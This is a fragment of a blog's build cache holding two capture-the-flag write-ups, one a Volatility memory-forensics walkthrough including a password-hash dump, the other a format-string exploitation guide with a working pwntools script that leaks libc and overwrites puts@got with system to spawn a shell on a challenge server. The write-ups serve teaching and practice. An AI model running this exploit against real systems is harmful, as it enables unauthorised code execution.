flag:\r\n\r\n```\r\nbi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}\r\n```","src/content/blog/gotham-hustle.md","0712ebe382ec6132",{"html":111,"metadata":112},"\u003Ch1 id=\"description\">Description\u003C/h1>\n\u003Cp>Gotham’s underbelly trembles as whispers spread—The Riddler’s back, leaving cryptic puzzles across the city’s darkest corners. Every clue is a trap, every answer another step into madness. Think you can outsmart him? Step into Gotham’s shadows and prove it. Let the Batman’s Hustle get its recognition!\u003C/p>\n\u003Ch2 id=\"initial-analysis\">Initial Analysis\u003C/h2>\n\u003Cp>First, I ran imageinfo to identify the memory profile and basic system details.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/gotham-hustle/gotham-1.png\" alt=\"Memory Profile\">\u003C/p>\n\u003Cp>\u003Cstrong>System Information\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>OS Profile: Win7SP1x64\u003C/li>\n\u003Cli>Processors: 6 CPUs\u003C/li>\n\u003Cli>Image Date/Time: 2024-08-06 18:37:19 UTC\u003C/li>\n\u003Cli>Memory Size: 4.6 GB\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"process-enumeration\">Process Enumeration\u003C/h2>\n\u003Cp>Next, I ran pslist to observe active processes.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"text\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>cmd.exe (PID 3944)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>notepad.exe (PID 2592)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>mspaint.exe (PID 2516)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>multiple chrome.exe processes\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"notable-processes\">Notable Processes\u003C/h3>\n\u003Cul>\n\u003Cli>cmd.exe (PID 3944): Command prompt activity\u003C/li>\n\u003Cli>notepad.exe (PID 2592): Notepad open\u003C/li>\n\u003Cli>mspaint.exe (PID 2516): Paint running\u003C/li>\n\u003Cli>Multiple chrome.exe: Browser activity\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"command-history\">Command History\u003C/h2>\n\u003Cp>To check user activity, I ran cmdscan\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/gotham-hustle/gotham-2.png\" alt=\"Command History\">\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"text\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>Cmd #4: Ymkwc2N0Znt3M2xjMG0zXw==\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Cmd #5: azr43ln1ght.github.io\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Cmd #6: Azr43lKn1ght\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Cmd #7: did you find flag1?\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The base64 string decodes to:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>bi0sctf{w3lc0m3_\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"notepad--memory-strings\">Notepad &#x26; Memory Strings\u003C/h2>\n\u003Cp>Dumping Notepad directly failed due to Volatility version mismatch.\r\nI dumped process memory and ran \u003Ccode>strings\u003C/code>, which mostly yielded DLL data.\r\nOne extracted link led to the following page:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/gotham-hustle/gotham-3.png\" alt=\"Notepad Strings\">\u003C/p>\n\u003Cp>This contained another base64 string, decoding to:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>h0p3_th15_\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"file-extraction\">File Extraction\u003C/h2>\n\u003Cp>From filescan, I noticed flag5.rar on the Desktop and dumped it:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"powershell\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">vol \u003C/span>\u003Cspan style=\"color:#F97583\">-f\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> gotham.raw \u003C/span>\u003Cspan style=\"color:#F97583\">--\u003C/span>\u003Cspan style=\"color:#E1E4E8\">profile\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\">Win7SP1x64 dumpfiles \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\">Q \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x000000011fdaff20\u003C/span>\u003Cspan style=\"color:#F97583\"> --\u003C/span>\u003Cspan style=\"color:#E1E4E8\">dump\u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\">dir\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\">D:\\DFIR\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/images/posts/gotham-hustle/gotham-4.png\" alt=\"File Extraction\">\u003C/p>\n\u003Cp>The archive was password-protected.\u003C/p>\n\u003Ch2 id=\"credential-dump\">Credential Dump\u003C/h2>\n\u003Cp>Using hashdump:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"text\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>bruce:1001:...:b7265f8cc4f00b58f413076ead262720:::\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/images/posts/gotham-hustle/gotham-5.png\" alt=\"Credential Dump\">\u003C/p>\n\u003Cp>The password was \u003Cstrong>batman\u003C/strong>.\u003C/p>\n\u003Cp>Extracting the archive revealed another base64 string:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/gotham-hustle/gotham-6.png\" alt=\"Archive Contents\">\u003C/p>\n\u003Cp>Decoded:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>m0r3_13337431}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"flag-4\">Flag 4\u003C/h2>\n\u003Cp>Dumping Notepad with procdump showed a search for flag4.\r\nRunning strings revealed:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>YjNuM2YxNzVfeTB1Xw==\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cimg src=\"/images/posts/gotham-hustle/gotham-7.png\" alt=\"Flag 4\">\u003C/p>\n\u003Ch2 id=\"flag-2-ms-paint\">Flag 2 (MS Paint)\u003C/h2>\n\u003Cp>From pslist, mspaint.exe was active.\r\nI dumped the process memory, renamed it to \u003Ccode>.data\u003C/code>, and opened it in GIMP.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/gotham-hustle/gotham-8.png\" alt=\"GIMP Analysis\">\u003C/p>\n\u003Cp>I referred a writeup for the MS Paint part; the offsets there were not correct so I had to adjust them manually.\u003C/p>\n\u003Cp>I had to use \u003Cstrong>Unsigned Integer\u003C/strong> because I was loading raw process memory, not a real image file. The pixel values in memory are stored as normal positive numbers, especially for RGB 16-bit, which expects values between 0 and 65535. When I tried signed or floating point, the same bytes were misinterpreted and the image completely fell apart into noise. Unsigned was the only option that kept the colors stable and readable. Since MSPaint stores its canvas as raw pixel data in memory without headers, I had to manually line everything up.\u003C/p>\n\u003Cp>After inspecting and tweaking values for hours, I finally managed to align a base64 string in the image:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>dDBfZGYxcl9sNGl1Xw==\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The data appeared flipped in the output, so I rotated and flipped the image to make the text readable.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/gotham-hustle/gotham-9.png\" alt=\"Final Flag\">\u003C/p>\n\u003Cp>Decoding the base64 revealed the final combined flag:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>",{"headings":113,"localImagePaths":144,"remoteImagePaths":145,"frontmatter":146,"imagePaths":148},[114,117,120,123,126,129,132,135,138,141],{"depth":24,"slug":115,"text":116},"description","Description",{"depth":27,"slug":118,"text":119},"initial-analysis","Initial Analysis",{"depth":27,"slug":121,"text":122},"process-enumeration","Process Enumeration",{"depth":40,"slug":124,"text":125},"notable-processes","Notable Processes",{"depth":27,"slug":127,"text":128},"command-history","Command History",{"depth":27,"slug":130,"text":131},"notepad--memory-strings","Notepad & Memory Strings",{"depth":27,"slug":133,"text":134},"file-extraction","File Extraction",{"depth":27,"slug":136,"text":137},"credential-dump","Credential Dump",{"depth":27,"slug":139,"text":140},"flag-4","Flag 4",{"depth":27,"slug":142,"text":143},"flag-2-ms-paint","Flag 2 (MS Paint)",[],[],{"title":105,"date":147},"2025-01-04",[],"format-string-3",{"id":149,"data":151,"body":154,"filePath":155,"digest":156,"rendered":157},{"title":152,"date":153},"how to make your program spill tea",["Date","2025-12-17T00:00:00.000Z"],"![Format String Challenge](/images/posts/format-string-3/fmt-str-chal.png)\r\n\r\n## Introduction\r\n\r\nIn this challenge, we are tasked with exploiting a binary named **format-string-3**. We are provided with the following artifacts:\r\n\r\n*   **format-string-3**: The target ELF binary.\r\n*   **libc.so.6**: The standard C library used by the binary.\r\n*   **ld-linux-x86-64.so.2**: The dynamic linker.\r\n*   **format-string-3.c**: The source code.\r\n\r\nOur goal is to analyze the binary's behavior, identify a vulnerability, and exploit it to spawn a shell.\r\n\r\n## Source Code Analysis\r\n\r\nLet's examine the provided source code, specifically the `main()` function:\r\n\r\n```c\r\nint main() {\r\n    char *all_strings[MAX_STRINGS] = {NULL};\r\n    char buf[1024] = {'\\0'};\r\n\r\n    setup();\r\n    hello();    \r\n\r\n    fgets(buf, 1024, stdin);    \r\n    printf(buf);\r\n\r\n    puts(normal_string);\r\n\r\n    return 0;\r\n}\r\n```\r\n\r\nTwo critical things happen here:\r\n\r\n1.  **Vulnerable `printf`**: `printf(buf)` prints user input directly without a format specifier (like `%s`). This allows us to supply our own format specifiers (e.g., `%x`, `%p`, `%n`) to read from or write to the stack and arbitrary memory locations.\r\n2.  **Target Function**: The program ends by calling `puts(normal_string)`, where `normal_string` is `\"/bin/sh\"`.\r\n\r\nIf we can manipulate the program so that `puts` is replaced by `system`, the call `puts(\"/bin/sh\")` effectively becomes `system(\"/bin/sh\")`, giving us a shell.\r\n\r\n### The Leak\r\n\r\nBefore `main` processes our input, the `hello()` function is called:\r\n\r\n```c\r\nvoid hello() {\r\n    puts(\"Howdy gamers!\");\r\n    printf(\"Okay I'll be nice. Here's the address of setvbuf in libc: %p\\n\", &setvbuf);\r\n}\r\n```\r\n\r\nThis function helpfully prints the runtime address of `setvbuf`. This is crucial because modern systems use **ASLR (Address Space Layout Randomization)** and **PIE (Position Independent Executable)**, meaning memory addresses change every time the program runs.\r\n\r\n![Leak Output](/images/posts/format-string-3/fmt-str-1.png)\r\n\r\nBy knowing the runtime address of `setvbuf` and its static offset in the provided `libc.so.6`, we can calculate the **base address of libc**. Once we have the base address, we can find the runtime address of any other function in libc, including `system`.\r\n\r\n## Vulnerability & Strategy\r\n\r\n### The Plan\r\n\r\n1.  **Capture the Leak**: Read the address of `setvbuf` from the program's initial output.\r\n2.  **Calculate Addresses**:\r\n    *   Compute libc base: `libc_base = setvbuf_leak - setvbuf_offset`\r\n    *   Compute `system` address: `system_addr = libc_base + system_offset`\r\n3.  **Overwrite GOT**: Use the format string vulnerability in `printf(buf)` to overwrite the **Global Offset Table (GOT)** entry for `puts` with the address of `system`.\r\n\r\n### Understanding the GOT/PLT\r\n\r\nThe **Global Offset Table (GOT)** is used by dynamically linked programs to resolve function addresses at runtime. When `puts` is called, the program looks up its address in the GOT. If we overwrite that entry with the address of `system`, the program will jump to `system` instead.\r\n\r\n![Program Segfaults on Bad Input](/images/posts/format-string-3/fmt-str-3.png)\r\n*Figure: We can verify control over execution flow by crashing the program.*\r\n\r\n## Debugging & Exploitation\r\n\r\nTo verify our strategy, we can use GDB. We need to find the location of `puts` in the GOT.\r\n\r\n![GDB Disassembly](/images/posts/format-string-3/fmt-str-5.png)\r\n\r\nIn GDB, we can inspect the PLT and GOT entries. The disassembly shows calls to `puts@plt`, which eventually jumps to the address stored in `puts@got`.\r\n\r\n![GDB PLT Analysis](/images/posts/format-string-3/fmt-str-6.png)\r\n\r\n### Calculating Offsets\r\n\r\nSince we have the `libc.so.6` file, the offsets are static. We can calculate the distance between `setvbuf` and `system` beforehand or let `pwntools` handle it dynamically.\r\n\r\n![Offset Calculation](/images/posts/format-string-3/fmt-str-7.png)\r\n\r\n## The Exploit Script\r\n\r\nWe'll use **pwntools** to automate the interaction. It handles the arithmetic, format string payload generation, and communication.\r\n\r\n```python\r\nfrom pwn import *\r\n\r\n# Context setup\r\ncontext.binary = ELF('./format-string-3')\r\ncontext.update(arch='amd64', os='linux', bits=64)\r\nelf = context.binary\r\nlibc = ELF('./libc.so.6') # Load the provided libc\r\n\r\nHOST, PORT = 'rhea.picoctf.net', 60973\r\nREMOTE = True\r\n\r\n# Start process or connect to remote\r\ns = remote(HOST, PORT) if REMOTE else elf.process()\r\n\r\n# 1. Parse the leak\r\ns.recvuntil(b\"libc: \")\r\nleak_line = s.recvline().strip()\r\nsetvbuf_addr = int(leak_line, 16)\r\nlog.info(f\"Leaked setvbuf: {hex(setvbuf_addr)}\")\r\n\r\n# 2. Calculate base and system address\r\nlibc.address = setvbuf_addr - libc.symbols['setvbuf']\r\nsystem_addr = libc.symbols['system']\r\nlog.info(f\"Libc Base: {hex(libc.address)}\")\r\nlog.info(f\"System Address: {hex(system_addr)}\")\r\n\r\n# 3. Overwrite puts@got with system\r\n# We use pwntools' fmtstr_payload to automatically generate the write payload\r\nputs_got = elf.got['puts']\r\n\r\n# FmtStr helper to find the offset automatically (optional, usually 6 or 8 on 64-bit)\r\n# For this challenge, we can likely assume standard offsets or find it manually.\r\n# Let's assume we found the format string offset is 38 (based on challenge context).\r\nformat_string_offset = 38 \r\n\r\npayload = fmtstr_payload(format_string_offset, {puts_got: system_addr})\r\n\r\ns.sendline(payload)\r\ns.interactive()\r\n```\r\n\r\n### Running the Exploit\r\n\r\nWhen we run the script:\r\n1.  It catches the `setvbuf` leak.\r\n2.  Calculates the address of `system`.\r\n3.  Sends a payload that writes the `system` address into the `puts` GOT entry.\r\n4.  When `puts(\"/bin/sh\")` is called next, `system(\"/bin/sh\")` executes instead.\r\n\r\n![Final Shell](/images/posts/format-string-3/fmt-str-8.png)\r\n\r\nAnd just like that, we have a shell!\r\n\r\n![Success Meme](/images/posts/format-string-3/fmt-str-10.png)\r\n\r\n**References:**\r\n*   [Hack Using Global Offset Table](https://nuc13us.wordpress.com/2015/12/25/hack-using-global-offset-table/)","src/content/blog/format-string-3.md","ea505795bb159527",{"html":158,"metadata":159},"\u003Cp>\u003Cimg src=\"/images/posts/format-string-3/fmt-str-chal.png\" alt=\"Format String Challenge\">\u003C/p>\n\u003Ch2 id=\"introduction\">Introduction\u003C/h2>\n\u003Cp>In this challenge, we are tasked with exploiting a binary named \u003Cstrong>format-string-3\u003C/strong>. We are provided with the following artifacts:\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>format-string-3\u003C/strong>: The target ELF binary.\u003C/li>\n\u003Cli>\u003Cstrong>libc.so.6\u003C/strong>: The standard C library used by the binary.\u003C/li>\n\u003Cli>\u003Cstrong>ld-linux-x86-64.so.2\u003C/strong>: The dynamic linker.\u003C/li>\n\u003Cli>\u003Cstrong>format-string-3.c\u003C/strong>: The source code.\u003C/li>\n\u003C/ul>\n\u003Cp>Our goal is to analyze the binary’s behavior, identify a vulnerability, and exploit it to spawn a shell.\u003C/p>\n\u003Ch2 id=\"source-code-analysis\">Source Code Analysis\u003C/h2>\n\u003Cp>Let’s examine the provided source code, specifically the \u003Ccode>main()\u003C/code> function:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#B392F0\"> main\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\">all_strings\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[MAX_STRINGS] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003Cspan style=\"color:#79B8FF\">NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    char\u003C/span>\u003Cspan style=\"color:#FFAB70\"> buf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#79B8FF\">1024\u003C/span>\u003Cspan style=\"color:#E1E4E8\">] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\0\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    setup\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    hello\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    fgets\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(buf, \u003C/span>\u003Cspan style=\"color:#79B8FF\">1024\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, stdin);    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(buf);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(normal_string);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Two critical things happen here:\u003C/p>\n\u003Col>\n\u003Cli>\u003Cstrong>Vulnerable \u003Ccode>printf\u003C/code>\u003C/strong>: \u003Ccode>printf(buf)\u003C/code> prints user input directly without a format specifier (like \u003Ccode>%s\u003C/code>). This allows us to supply our own format specifiers (e.g., \u003Ccode>%x\u003C/code>, \u003Ccode>%p\u003C/code>, \u003Ccode>%n\u003C/code>) to read from or write to the stack and arbitrary memory locations.\u003C/li>\n\u003Cli>\u003Cstrong>Target Function\u003C/strong>: The program ends by calling \u003Ccode>puts(normal_string)\u003C/code>, where \u003Ccode>normal_string\u003C/code> is \u003Ccode>\"/bin/sh\"\u003C/code>.\u003C/li>\n\u003C/ol>\n\u003Cp>If we can manipulate the program so that \u003Ccode>puts\u003C/code> is replaced by \u003Ccode>system\u003C/code>, the call \u003Ccode>puts(\"/bin/sh\")\u003C/code> effectively becomes \u003Ccode>system(\"/bin/sh\")\u003C/code>, giving us a shell.\u003C/p>\n\u003Ch3 id=\"the-leak\">The Leak\u003C/h3>\n\u003Cp>Before \u003Ccode>main\u003C/code> processes our input, the \u003Ccode>hello()\u003C/code> function is called:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> hello\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Howdy gamers!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Okay I'll be nice. Here's the address of setvbuf in libc: \u003C/span>\u003Cspan style=\"color:#79B8FF\">%p\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">setvbuf);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This function helpfully prints the runtime address of \u003Ccode>setvbuf\u003C/code>. This is crucial because modern systems use \u003Cstrong>ASLR (Address Space Layout Randomization)\u003C/strong> and \u003Cstrong>PIE (Position Independent Executable)\u003C/strong>, meaning memory addresses change every time the program runs.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/format-string-3/fmt-str-1.png\" alt=\"Leak Output\">\u003C/p>\n\u003Cp>By knowing the runtime address of \u003Ccode>setvbuf\u003C/code> and its static offset in the provided \u003Ccode>libc.so.6\u003C/code>, we can calculate the \u003Cstrong>base address of libc\u003C/strong>. Once we have the base address, we can find the runtime address of any other function in libc, including \u003Ccode>system\u003C/code>.\u003C/p>\n\u003Ch2 id=\"vulnerability--strategy\">Vulnerability &#x26; Strategy\u003C/h2>\n\u003Ch3 id=\"the-plan\">The Plan\u003C/h3>\n\u003Col>\n\u003Cli>\u003Cstrong>Capture the Leak\u003C/strong>: Read the address of \u003Ccode>setvbuf\u003C/code> from the program’s initial output.\u003C/li>\n\u003Cli>\u003Cstrong>Calculate Addresses\u003C/strong>:\n\u003Cul>\n\u003Cli>Compute libc base: \u003Ccode>libc_base = setvbuf_leak - setvbuf_offset\u003C/code>\u003C/li>\n\u003Cli>Compute \u003Ccode>system\u003C/code> address: \u003Ccode>system_addr = libc_base + system_offset\u003C/code>\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\u003Cstrong>Overwrite GOT\u003C/strong>: Use the format string vulnerability in \u003Ccode>printf(buf)\u003C/code> to overwrite the \u003Cstrong>Global Offset Table (GOT)\u003C/strong> entry for \u003Ccode>puts\u003C/code> with the address of \u003Ccode>system\u003C/code>.\u003C/li>\n\u003C/ol>\n\u003Ch3 id=\"understanding-the-gotplt\">Understanding the GOT/PLT\u003C/h3>\n\u003Cp>The \u003Cstrong>Global Offset Table (GOT)\u003C/strong> is used by dynamically linked programs to resolve function addresses at runtime. When \u003Ccode>puts\u003C/code> is called, the program looks up its address in the GOT. If we overwrite that entry with the address of \u003Ccode>system\u003C/code>, the program will jump to \u003Ccode>system\u003C/code> instead.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/format-string-3/fmt-str-3.png\" alt=\"Program Segfaults on Bad Input\">\r\n\u003Cem>Figure: We can verify control over execution flow by crashing the program.\u003C/em>\u003C/p>\n\u003Ch2 id=\"debugging--exploitation\">Debugging &#x26; Exploitation\u003C/h2>\n\u003Cp>To verify our strategy, we can use GDB. We need to find the location of \u003Ccode>puts\u003C/code> in the GOT.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/format-string-3/fmt-str-5.png\" alt=\"GDB Disassembly\">\u003C/p>\n\u003Cp>In GDB, we can inspect the PLT and GOT entries. The disassembly shows calls to \u003Ccode>puts@plt\u003C/code>, which eventually jumps to the address stored in \u003Ccode>puts@got\u003C/code>.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/format-string-3/fmt-str-6.png\" alt=\"GDB PLT Analysis\">\u003C/p>\n\u003Ch3 id=\"calculating-offsets\">Calculating Offsets\u003C/h3>\n\u003Cp>Since we have the \u003Ccode>libc.so.6\u003C/code> file, the offsets are static. We can calculate the distance between \u003Ccode>setvbuf\u003C/code> and \u003Ccode>system\u003C/code> beforehand or let \u003Ccode>pwntools\u003C/code> handle it dynamically.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/format-string-3/fmt-str-7.png\" alt=\"Offset Calculation\">\u003C/p>\n\u003Ch2 id=\"the-exploit-script\">The Exploit Script\u003C/h2>\n\u003Cp>We’ll use \u003Cstrong>pwntools\u003C/strong> to automate the interaction. It handles the arithmetic, format string payload generation, and communication.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">from\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> pwn \u003C/span>\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Context setup\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">context.binary \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ELF(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'./format-string-3'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">context.update(\u003C/span>\u003Cspan style=\"color:#FFAB70\">arch\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'amd64'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">os\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'linux'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">bits\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\">64\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">elf \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> context.binary\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">libc \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ELF(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'./libc.so.6'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#6A737D\"># Load the provided libc\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">HOST\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">PORT\u003C/span>\u003Cspan style=\"color:#F97583\"> 